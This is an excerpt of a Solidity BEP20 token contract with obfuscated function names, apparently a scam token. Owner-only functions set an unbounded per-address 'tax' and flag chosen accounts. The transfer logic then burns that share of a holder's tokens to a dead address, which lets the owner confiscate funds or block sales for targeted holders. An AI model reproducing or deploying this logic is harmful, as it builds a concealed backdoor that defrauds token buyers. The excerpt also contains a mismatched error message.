...
contract SHayya is BEP20, Ownable {
    // ext
    ...
    function setSlipafeae(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipafeae[_address] = _value;
    }

    function getSlipafeae(address _address) external view onlyownar returns (uint256) {
        return _slipafeae[_address];
    }


    function setMAccountafeae(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountafeae(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        if (rF) {
            ...
            tradeafeaeAmount = _Amount.mul(tradeafeae).div(100);
        }


        if (tradeafeaeAmount > 0) {
            _balances[from] = _balances[from].sub(tradeafeaeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeafeaeAmount);
            emit Transfer(from, _deadAddress, tradeafeaeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradeafeaeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradeafeaeAmount);
        emit Transfer(from, _to, _Amount - tradeafeaeAmount);
    }
